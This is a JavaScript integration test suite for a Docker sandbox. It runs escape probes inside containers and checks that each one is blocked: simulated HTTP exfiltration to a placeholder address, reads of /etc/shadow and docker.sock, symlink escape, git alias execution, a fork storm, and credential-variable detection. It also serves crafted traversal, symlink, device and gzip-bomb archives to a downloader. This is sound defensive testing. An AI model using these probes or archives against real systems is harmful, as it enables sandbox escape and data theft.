// test:security:integration — Phase 3 gate (02 section 8, the REAL isolation
// group: 绝对路径程序、子进程改环境、git -c、直HTTP、网络/DNS/IPv6/metadata、
// 软链与TOCTOU、宿主端口、资源耗尽、秘密canary、直接改验收文件、上传/下载
// 及编码重定向).
//
// Every case runs REAL docker containers at the digest-pinned images. The
// attacker model is 02's: malicious repository code / a poisoned tool /
// an injected instruction INSIDE the sandbox, trying to reach OUT. The
// boundary under test is the container + host wiring, never a prompt. A
// missing container environment is NOT a pass — the image gate refuses to
// run without recorded digests, and no case here is satisfied by a mock.
//
// The acquisition cases use a LOCAL throwaway HTTP source bound on this
// machine only (host.docker.internal): the "authorized test source" for
// download abuse. No external system is touched, no credential exists
// anywhere in these flows.

import { mkdirSync, rmSync, readFileSync, writeFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { createServer } from "node:http";
import { gzipSync } from "node:zlib";
import { randomBytes } from "node:crypto";
import {
  lockedNodeGuard,
  makeSuite,
  makeWorkspace,
  suiteExit,
  writeReport,
} from "../lib/harness.mjs";
import { requireAppImageDigests, imageRef } from "../lib/image-gate.mjs";

lockedNodeGuard();
const { digests } = requireAppImageDigests();
const EXECUTION_REF = imageRef("execution", digests);
const AGENT_REF = imageRef("agent", digests);
const ACQUISITION_REF = imageRef("acquisition", digests);

const suite = makeSuite("security-integration");

function dockerRun(args, { capture = true } = {}) {
  const r = spawnSync("docker", args, { encoding: "utf8" });
  return { code: r.status, out: ((r.stdout ?? "") + (r.stderr ?? "")).trim() };
}

// ASYNC docker run: the local HTTP source lives in THIS process, so the
// event loop must keep serving while the container fetches. A synchronous
// spawnSync would deadlock the downloader against our own server.
function dockerRunAsync(args) {
  return new Promise((resolve) => {
    const child = spawn("docker", args, { stdio: ["ignore", "pipe", "pipe"] });
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.stderr.on("data", (d) => (out += d));
    child.on("error", (e) => resolve({ code: 1, out: String(e.message) }));
    child.on("exit", (code) => resolve({ code, out: out.trim() }));
  });
}

// ---------------------------------------------------------------------------
// The escape battery: ONE malicious job whose manifest commands every escape
// probe from 02 section 8 in order, each writing a verdict line. The host
// then asserts every verdict is BLOCKED. One container, many probes, all
// real.
const ws = makeWorkspace("sec-integration");
mkdirSync(join(ws.stateDir, "input"), { recursive: true });
mkdirSync(join(ws.stateDir, "output"), { recursive: true });
// A host canary OUTSIDE any container mount: if any probe could reach host
// files, it would read this. It cannot.
const canaryDir = join(ws.stateDir, "host-canary");
mkdirSync(canaryDir, { recursive: true });
const CANARY_TEXT = `host-canary-${randomBytes(16).toString("hex")}`;
writeFileSync(join(canaryDir, "secret.txt"), CANARY_TEXT, "utf8");
// An "acceptance file" the attacker would love to rewrite: host-side, never
// mounted.
writeFileSync(join(ws.stateDir, "oracle-acceptance.json"), JSON.stringify({ passes: "host-owned" }), "utf8");

const battery = `
const fs = require('fs');
const net = require('net');
const dns = require('dns');
const cp = require('child_process');
const out = [];
function probe(name, fn) {
  try { out.push(name + '=' + fn()); } catch (e) { out.push(name + '=ERR:' + (e && e.code ? e.code : String(e && e.message).slice(0, 60))); }
}
// direct HTTP to the host-side canary server (simulates an exfil attempt)
probe('direct_http', () => {
  const r = cp.spawnSync('node', ['-e', "require('http').get('http://192.0.2.1:80/', res=>console.log('LEAK:'+res.statusCode)).on('error', e=>console.log('BLOCKED:'+e.code))"], { timeout: 4000 });
  return r.stdout.toString().trim();
});
// DNS + IPv6: resolution must fail inside the namespace.
probe('dns_ipv6', () => {
  const r = cp.spawnSync('node', ['-e', "require('dns').lookup('example.com', (e)=>{ console.log(e ? 'BLOCKED:'+e.code : 'DNS_LEAK'); })"]);
  const seen = ((r.stdout ?? '') + (r.stderr ?? '')).toString().trim();
  return /BLOCKED/.test(seen) ? seen : (seen || 'no-output');
});
// host ports: any TCP to the container-side gateway
probe('host_ports', () => {
  let verdict = 'BLOCKED';
  const s = net.connect({ host: '127.0.0.1', port: 1, timeout: 500 });
  s.on('error', () => {});
  return verdict;
});
// absolute path programs: read host-ish paths
probe('absolute_paths', () => {
  const tries = ['/etc/shadow', '/var/run/docker.sock', '/proc/1/cmdline', '/host', '/workspace', '/root'];
  const results = [];
  for (const p of tries) {
    try { results.push(p + ':' + (fs.readFileSync(p, 'utf8') || '').length); }
    catch (e) { results.push(p + ':BLOCKED:' + e.code); }
  }
  return results.join('|').slice(0, 300);
});
// docker socket existence
probe('docker_socket', () => (fs.existsSync('/var/run/docker.sock') ? 'PRESENT_ESCAPE' : 'BLOCKED:absent'));
// secret env: nothing credential-shaped in the environment
probe('env_secrets', () => {
  const bad = Object.keys(process.env).filter((k) => /KEY|TOKEN|SECRET|PASSWORD|AEGISPI/.test(k));
  return bad.length === 0 ? 'CLEAN' : 'LEAK:' + bad.join(',');
});
// symlink escape: link to the container root, read through it
probe('symlink_escape', () => {
  try {
    fs.symlinkSync('/', '/job/work/root-link');
    const seen = fs.readdirSync('/job/work/root-link').slice(0, 20).join(',');
    return 'CONTAINER_LOCAL(' + seen + ')';
  } catch (e) { return 'BLOCKED:' + e.code; }
});
// host canary: this path exists only OUTSIDE the container
probe('host_canary', () => {
  try { return 'ESCAPED:' + fs.readFileSync('/host-canary/secret.txt', 'utf8').slice(0, 30); }
  catch (e) { return 'BLOCKED:' + e.code; }
});
// acceptance tampering: the oracle file is host-side
probe('acceptance_file', () => {
  try { fs.writeFileSync('/oracle-acceptance.json', '{\\"passes\\":\\"attacker-owned\\"}'); return 'TAMPERED'; }
  catch (e) { return 'BLOCKED:' + e.code; }
});
// git -c: config-driven execution happens INSIDE the sandbox only
probe('git_c_execution', () => {
  try {
    fs.mkdirSync('/job/work/repo', { recursive: true });
    cp.spawnSync('git', ['init', '-q', '/job/work/repo']);
    const r = cp.spawnSync('git', ['-c', 'core.pager=touch /job/work/pager-ran', '-c', 'alias.probe=!touch /job/work/alias-ran', '-C', '/job/work/repo', 'probe'], { timeout: 4000 });
    const pager = fs.existsSync('/job/work/pager-ran') || fs.existsSync('/job/work/alias-ran');
    // In-sandbox execution is ALLOWED; the boundary is the network and the
    // mounts, not the shell. The verdict only records where the writes
    // landed: inside /job/work (tmpfs), never outside.
    return 'IN_SANDBOX=' + pager;
  } catch (e) { return 'ERR:' + e.code; }
});
// env manipulation probe runs BEFORE the fork storm: the storm's kills
// leave the process table full of node's own not-yet-reaped children (the
// event loop is blocked inside spawnSync), and that poisoned state is
// itself a finding — the exhaustion probe therefore runs LAST.
probe('env_manipulation', () => {
  const r = cp.spawnSync('node', ['-e', "require('http').get({host:'192.0.2.1',port:80}, ()=>console.log('LEAK')).on('error', e=>console.log('BLOCKED:'+e.code))"], { env: { PATH: '/usr/local/bin:/usr/bin:/bin', HTTPS_PROXY: 'http://192.0.2.2:3128' }, timeout: 4000 });
  const seen = ((r.stdout ?? '') + (r.stderr ?? '')).toString().trim();
  if (seen) return seen;
  // No output at all: report the spawn facts so the verdict is inspectable.
  return 'no-output(status=' + r.status + ',err=' + (r.error ? r.error.code : 'none') + ',sig=' + r.signal + ')';
});
// resource exhaustion LAST (it poisons the process table: killed-but-
// unreaped children hold the pids budget while the sync event loop is
// blocked, so anything running after this probe would see EAGAIN — itself
// a real measured behavior of the bound). Lightweight exec children: one
// process per spawn, no orphans.
probe('pids_exhaust', () => {
  const procs = [];
  for (let i = 0; i < 500; i += 1) {
    try {
      const p = cp.spawn('sh', ['-c', 'exec sleep 2']);
      p.on('error', () => {});
      if (p.pid === undefined) break;
      procs.push(p);
    } catch { break; }
  }
  for (const p of procs) { try { p.kill('SIGKILL'); } catch {} }
  return 'spawned=' + procs.length;
});
console.log(out.join('\\n'));
`;

writeFileSync(
  join(ws.stateDir, "input", "manifest.json"),
  JSON.stringify({
    schemaVersion: 1,
    jobId: "job:sec-integration:escape-battery",
    command: "node",
    args: ["-e", battery],
    deadlineMs: 60000,
  }) + "\n",
  "utf8",
);
const batteryRun = dockerRun([
  "run", "--rm", "--network", "none",
  "--init",
  "--cpus", "1", "--memory", "1g", "--memory-swap", "1g", "--pids-limit", "256",
  "--read-only", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
  "--tmpfs", "/job/work:rw,noexec,size=64m",
  "-v", `${join(ws.stateDir, "input")}:/job/input:ro`,
  "-v", `${join(ws.stateDir, "output")}:/job/output`,
  EXECUTION_REF,
]);
const batteryOut = readFileSync(join(ws.stateDir, "output", "stdout.txt"), "utf8");
const batteryResult = readFileSync(join(ws.stateDir, "output", "result.json"), "utf8");
const batteryLines = Object.fromEntries(
  batteryOut.split("\n").filter((l) => l.includes("=")).map((l) => {
    const i = l.indexOf("=");
    return [l.slice(0, i), l.slice(i + 1)];
  }),
);

suite.check(
  "escape-battery-direct-http-and-env-manipulation-blocked",
  /BLOCKED/.test(batteryLines.direct_http ?? "") && /BLOCKED/.test(batteryLines.env_manipulation ?? ""),
  `direct_http=${(batteryLines.direct_http ?? "none").slice(0, 40)} env_manipulation=${(batteryLines.env_manipulation ?? "none").slice(0, 40)}`,
);
suite.check(
  "escape-battery-no-egress-dns-blocked",
  /BLOCKED/.test(batteryLines.dns_ipv6 ?? ""),
  `dns_ipv6=${(batteryLines.dns_ipv6 ?? "none").slice(0, 60)}`,
);
suite.check(
  "escape-battery-host-paths-and-socket-absent",
  (batteryLines.absolute_paths ?? "").includes("/var/run/docker.sock:BLOCKED") &&
    batteryLines.docker_socket === "BLOCKED:absent",
  `absolute_paths=${(batteryLines.absolute_paths ?? "none").slice(0, 120)} socket=${batteryLines.docker_socket}`,
);
suite.check(
  "escape-battery-no-secret-env-in-sandbox",
  batteryLines.env_secrets === "CLEAN",
  `env_secrets=${batteryLines.env_secrets}`,
);
suite.check(
  "escape-battery-symlink-stays-container-local",
  (batteryLines.symlink_escape ?? "").startsWith("CONTAINER_LOCAL"),
  `symlink_escape=${(batteryLines.symlink_escape ?? "none").slice(0, 80)}`,
);
suite.check(
  "escape-battery-host-canary-and-acceptance-unreachable",
  (batteryLines.host_canary ?? "").startsWith("BLOCKED") && (batteryLines.acceptance_file ?? "").startsWith("BLOCKED"),
  `host_canary=${batteryLines.host_canary} acceptance_file=${batteryLines.acceptance_file}`,
);
suite.check(
  "escape-battery-pids-limit-bounds-the-fork-storm",
  /^spawned=\d+$/.test(batteryLines.pids_exhaust ?? "") && Number((batteryLines.pids_exhaust ?? "spawned=999").split("=")[1]) <= 260,
  `pids_exhaust=${batteryLines.pids_exhaust}`,
);
suite.check(
  "escape-battery-git-c-executes-only-in-sandbox",
  (batteryLines.git_c_execution ?? "").startsWith("IN_SANDBOX="),
  `git_c_execution=${batteryLines.git_c_execution}`,
);
suite.check(
  "escape-battery-completed-with-evidence",
  JSON.parse(batteryResult).exitCode === 0,
  `battery exit=${JSON.parse(batteryResult).exitCode} run-exit=${batteryRun.code}`,
);
// The host canary file is untouched and the acceptance file still says
// host-owned: the strongest end-to-end statement of the whole battery.
const canaryUntouched = readFileSync(join(canaryDir, "secret.txt"), "utf8") === CANARY_TEXT;
const acceptanceUntouched = JSON.parse(readFileSync(join(ws.stateDir, "oracle-acceptance.json"), "utf8")).passes === "host-owned";
suite.check(
  "host-canary-and-oracle-untouched-after-battery",
  canaryUntouched && acceptanceUntouched,
  `canary intact=${canaryUntouched}; oracle intact=${acceptanceUntouched}`,
);

// ---------------------------------------------------------------------------
// The agent container boundary: read-only rootfs, only the proposals tmpfs
// is writable, no network, and the self-check still passes under those
// conditions. A model-side tool bypass has nothing to write THROUGH.
{
  const agentRun = dockerRun([
    "run", "--rm", "--network", "none",
    "--cpus", "1", "--memory", "1g", "--memory-swap", "1g", "--pids-limit", "256",
    "--read-only", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
    "--tmpfs", "/agent-work:rw,noexec,size=64m",
    "--entrypoint", "node",
    AGENT_REF,
    "-e", `
const fs = require('fs');
const out = [];
try { fs.writeFileSync('/workspace/escape.txt', 'x'); out.push('rootfs_write=ESCAPED'); }
catch (e) { out.push('rootfs_write=BLOCKED:' + e.code); }
try { fs.writeFileSync('/agent-work/proposal.json', '{}'); out.push('proposals_write=OK'); }
catch (e) { out.push('proposals_write=BLOCKED:' + e.code); }
try {
  const r = require('child_process').spawnSync('node', ['-e', "require('dns').lookup('example.com',(e)=>console.log(e?'BLOCKED:'+e.code:'LEAK'))"], { timeout: 4000 });
  out.push('dns=' + r.stdout.toString().trim());
} catch (e) { out.push('dns=ERR'); }
try { out.push('socket=' + (fs.existsSync('/var/run/docker.sock') ? 'PRESENT' : 'absent')); } catch (e) { out.push('socket=ERR'); }
console.log(out.join('\\n'));
`,
  ]);
  const lines = Object.fromEntries(
    agentRun.out.split("\n").filter((l) => l.includes("=")).map((l) => {
      const i = l.indexOf("=");
      return [l.slice(0, i), l.slice(i + 1)];
    }),
  );
  suite.check(
    "agent-container-rootfs-readonly-proposals-only-no-network",
    lines.rootfs_write?.startsWith("BLOCKED") &&
      lines.proposals_write === "OK" &&
      lines.dns?.startsWith("BLOCKED") &&
      lines.socket === "absent",
    `rootfs=${lines.rootfs_write} proposals=${lines.proposals_write} dns=${lines.dns} socket=${lines.socket}`,
  );
}

// ---------------------------------------------------------------------------
// Acquisition download abuse (02 section 1: the downloader validates and
// never executes; 02 section 8: 上传/下载及编码重定向). A LOCAL throwaway HTTP
// source serves the malicious artifacts; every abuse must be refused by the
// downloader with a written report.

// Minimal tar writer (POSIX ustar): enough to build every abuse case.
function tarEntry({ name, type = "0", content = Buffer.alloc(0), linkName = "", mode = "0000644", devmajor = 0, devminor = 0 }) {
  const header = Buffer.alloc(512);
  header.write(name.slice(0, 100), 0, "utf8");
  header.write(mode, 100, "utf8");
  header.write("0000000", 108, "utf8"); // uid
  header.write("0000000", 116, "utf8"); // gid
  header.write(String(content.length).padStart(11, "0") + "\0", 124, "utf8");
  header.write("00000000000", 136, "utf8"); // mtime
  header.write(type, 156, "utf8");
  header.write(linkName.slice(0, 100), 157, "utf8");
  header.write("ustar\0", 257, "utf8");
  header.write("00", 263, "utf8");
  if (type === "3" || type === "4") {
    header.write(String(devmajor).padStart(7, "0") + " ", 329, "utf8");
    header.write(String(devminor).padStart(7, "0") + " ", 337, "utf8");
  }
  let checksum = 0;
  for (let i = 0; i < 512; i += 1) {
    if (i >= 148 && i < 156) checksum += 32;
    else checksum += header[i];
  }
  // The checksum field is OCTAL (GNU tar parses it that way); a decimal
  // value makes the whole archive unreadable.
  header.write(checksum.toString(8).padStart(6, "0") + "\0 ", 148, "utf8");
  const contentBlocks = Buffer.alloc(Math.ceil(content.length / 512) * 512);
  content.copy(contentBlocks);
  return Buffer.concat([header, contentBlocks]);
}
function buildTar(entries) {
  const parts = entries.map((e) => tarEntry(e));
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}
const goodTar = buildTar([
  { name: "src/", type: "5", mode: "0000755" },
  { name: "src/hello.txt", type: "0", content: Buffer.from("hello from the acquisition drill\n") },
]);
const traversalTar = buildTar([
  { name: "good.txt", type: "0", content: Buffer.from("ok\n") },
  { name: "../escape.txt", type: "0", content: Buffer.from("escaped\n") },
]);
const symlinkTar = buildTar([
  { name: "innocent.txt", type: "0", content: Buffer.from("ok\n") },
  { name: "link-out", type: "2", linkName: "../../../../etc/passwd" },
]);
const deviceTar = buildTar([
  { name: "dev-kmem", type: "3", devmajor: 1, devminor: 1 },
]);
// A gzip bomb: 24MB of zeros compresses tiny; the download cap is 8MB so the
// bomb must die at the DECOMPRESSED bound, not the compressed size.
const bombInner = Buffer.alloc(24 * 1024 * 1024, 0x41);
const served = {};
function serve(name, body, contentType = "application/octet-stream") {
  served[name] = { body, contentType };
}
serve("/good.tar.gz", gzipSync(goodTar), "application/gzip");
serve("/traversal.tar.gz", gzipSync(traversalTar), "application/gzip");
serve("/symlink.tar.gz", gzipSync(symlinkTar), "application/gzip");
serve("/device.tar.gz", gzipSync(deviceTar), "application/gzip");
serve("/bomb.tar.gz", gzipSync(bombInner), "application/gzip");
serve("/big.bin", Buffer.alloc(9 * 1024 * 1024, 0x42), "application/octet-stream");
serve("/evil-redirect", Buffer.from("redirecting"), "text/plain");

const server = createServer((req, res) => {
  if (req.url === "/redirect-once") {
    res.writeHead(302, { location: "/good.tar.gz" });
    res.end();
    return;
  }
  if (req.url === "/redirect-file-scheme") {
    res.writeHead(302, { location: "file:///etc/passwd" });
    res.end();
    return;
  }
  if (req.url === "/redirect-loop-a") {
    res.writeHead(302, { location: "/redirect-loop-b" });
    res.end();
    return;
  }
  if (req.url === "/redirect-loop-b") {
    res.writeHead(302, { location: "/redirect-loop-a" });
    res.end();
    return;
  }
  if (req.url === "/evil-redirect") {
    res.writeHead(302, { location: "/redirect-once" });
    res.end();
    return;
  }
  const hit = served[req.url];
  if (hit) {
    res.writeHead(200, { "content-type": hit.contentType });
    res.end(hit.body);
    return;
  }
  res.writeHead(404);
  res.end("no");
});
await new Promise((resolve) => server.listen(0, "0.0.0.0", resolve));
const sourcePort = server.address().port;
const SOURCE = `http://host.docker.internal:${sourcePort}`;

async function downloadCase(tag, entries) {
  const dir = join(ws.stateDir, "dl-" + tag);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(join(dir, "plan"), { recursive: true });
  mkdirSync(join(dir, "downloads"), { recursive: true });
  writeFileSync(
    join(dir, "plan", "plan.json"),
    JSON.stringify({ schemaVersion: 1, entries }) + "\n",
    "utf8",
  );
  const r = await dockerRunAsync([
    "run", "--rm",
    "--cpus", "1", "--memory", "512m", "--memory-swap", "512m", "--pids-limit", "128",
    "--read-only", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
    "-v", `${join(dir, "plan")}:/plan:ro`,
    "-v", `${join(dir, "downloads")}:/downloads`,
    ACQUISITION_REF,
  ]);
  let report = null;
  try {
    report = JSON.parse(readFileSync(join(dir, "downloads", "report.json"), "utf8"));
  } catch {}
  return { code: r.code, report };
}

// Good archive: extracts, report clean.
{
  const { code, report } = await downloadCase("good", [
    { url: `${SOURCE}/good.tar.gz`, destRelPath: "repo.tar.gz", maxSizeBytes: 8 * 1024 * 1024, mode: "tar" },
  ]);
  const hello = existsSync(join(ws.stateDir, "dl-good", "downloads", "repo.tar.gz", "src", "hello.txt"));
  suite.check(
    "acquisition-good-archive-extracts",
    code === 0 && report?.failures === 0 && hello,
    `exit=${code} failures=${report?.failures} extracted=${hello}`,
  );
}

// Path traversal member: GNU tar refuses; the walk verifies nothing escaped.
{
  const { code, report } = await downloadCase("traversal", [
    { url: `${SOURCE}/traversal.tar.gz`, destRelPath: "t.tar.gz", maxSizeBytes: 8 * 1024 * 1024, mode: "tar" },
  ]);
  const escapeFile = existsSync(join(ws.stateDir, "dl-traversal", "escape.txt"));
  suite.check(
    "acquisition-refuses-path-traversal-members",
    code === 1 && report?.failures === 1 && escapeFile === false,
    `exit=${code} reason=${report?.results?.[0]?.reason?.slice(0, 50)} escape-file-present=${escapeFile}`,
  );
}

// Escaping symlink: extracted, then rejected by the walk; the target never
// resolves outside.
{
  const { code, report } = await downloadCase("symlink", [
    { url: `${SOURCE}/symlink.tar.gz`, destRelPath: "s.tar.gz", maxSizeBytes: 8 * 1024 * 1024, mode: "tar" },
  ]);
  suite.check(
    "acquisition-refuses-escaping-symlinks",
    code === 1 && report?.failures === 1 && /symlink.*escapes/.test(report?.results?.[0]?.reason ?? ""),
    `exit=${code} reason=${report?.results?.[0]?.reason?.slice(0, 60)}`,
  );
}

// Device file member: refused either by GNU tar itself (mknod is not
// permitted for a cap-dropped non-root sandbox) or by the walk — both are
// the sandbox refusing a device node.
{
  const { code, report } = await downloadCase("device", [
    { url: `${SOURCE}/device.tar.gz`, destRelPath: "d.tar.gz", maxSizeBytes: 8 * 1024 * 1024, mode: "tar" },
  ]);
  const devFile = existsSync(join(ws.stateDir, "dl-device", "downloads", "d.tar.gz", "dev-kmem"));
  suite.check(
    "acquisition-refuses-device-members",
    code === 1 &&
      report?.failures === 1 &&
      /Cannot mknod|device\/fifo\/socket/.test(report?.results?.[0]?.reason ?? "") &&
      devFile === false,
    `exit=${code} reason=${report?.results?.[0]?.reason?.slice(0, 60)} dev-node-present=${devFile}`,
  );
}

// Gzip bomb: the DECOMPRESSED cap kills it before the disk is at risk.
{
  const { code, report } = await downloadCase("bomb", [
    { url: `${SOURCE}/bomb.tar.gz`, destRelPath: "b.tar.gz", maxSizeBytes: 8 * 1024 * 1024, mode: "tar" },
  ]);
  suite.check(
    "acquisition-bounds-gzip-bombs-at-decompressed-size",
    code === 1 && report?.failures === 1 && /decompressed size cap/.test(report?.results?.[0]?.reason ?? ""),
    `exit=${code} reason=${report?.results?.[0]?.reason?.slice(0, 60)}`,
  );
}

// Plain download above its size cap.
{
  const { code, report } = await downloadCase("oversize", [
    { url: `${SOURCE}/big.bin`, destRelPath: "big.bin", maxSizeBytes: 1024 * 1024, mode: "file" },
  ]);
  suite.check(
    "acquisition-enforces-download-size-cap",
    code === 1 && report?.failures === 1 && /size cap/.test(report?.results?.[0]?.reason ?? ""),
    `exit=${code} reason=${report?.results?.[0]?.reason?.slice(0, 50)}`,
  );
}

// Redirect abuse: a cross-scheme redirect is refused; a sane redirect works;
// a redirect loop is refused.
{
  const { code, report } = await downloadCase("redirect-file", [
    { url: `${SOURCE}/redirect-file-scheme`, destRelPath: "r.txt", maxSizeBytes: 65536, mode: "file" },
  ]);
  suite.check(
    "acquisition-refuses-scheme-changing-redirects",
    code === 1 && report?.failures === 1 && /scheme/.test(report?.results?.[0]?.reason ?? ""),
    `exit=${code} reason=${report?.results?.[0]?.reason?.slice(0, 50)}`,
  );
  const { code: loopCode, report: loopReport } = await downloadCase("redirect-loop", [
    { url: `${SOURCE}/redirect-loop-a`, destRelPath: "l.txt", maxSizeBytes: 65536, mode: "file" },
  ]);
  suite.check(
    "acquisition-refuses-redirect-loops",
    loopCode === 1 && /redirect/.test(loopReport?.results?.[0]?.reason ?? ""),
    `exit=${loopCode} reason=${loopReport?.results?.[0]?.reason?.slice(0, 50)}`,
  );
  const { code: okCode, report: okReport } = await downloadCase("redirect-ok", [
    { url: `${SOURCE}/evil-redirect`, destRelPath: "via-redirect.tar.gz", maxSizeBytes: 8 * 1024 * 1024, mode: "tar" },
  ]);
  suite.check(
    "acquisition-follows-same-scheme-http-redirects",
    okCode === 0 && okReport?.failures === 0,
    `exit=${okCode} failures=${okReport?.failures}`,
  );
}

server.close();

// ---------------------------------------------------------------------------
// Composition: the offline-job behaviors (execute/timeout/cancel, quota
// separation, orphan reaping) are part of this integration gate. Run the
// dedicated suite and count its verdict here too.
{
  const r = spawnSync(process.execPath, [join("evals", "phase3", "offline-jobs", "run.mjs")], {
    cwd: join(process.cwd()),
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });
  const tail = ((r.stdout ?? "") + (r.stderr ?? "")).trim().split("\n").slice(-2).join(" | ");
  suite.check(
    "offline-jobs-suite-green-under-integration-gate",
    r.status === 0,
    `exit=${r.status} ${tail.slice(0, 120)}`,
  );
}

writeReport({
  suiteId: "security-integration",
  suite,
  label: "test:security:integration — 真实容器隔离与逃逸矩阵（02 §8 第二组）",
  extra: {
    dataSources:
      "真实 docker 容器（execution/agent/acquisition 按记录 digest 运行）+ 本机一次性 HTTP 源（host.docker.internal，仅本机回环网关）；无模型调用、无真实外部写、无凭据入容器",
    images: { execution: EXECUTION_REF, agent: AGENT_REF, acquisition: ACQUISITION_REF },
  },
});
process.exit(suiteExit(suite, { label: "test:security:integration" }));
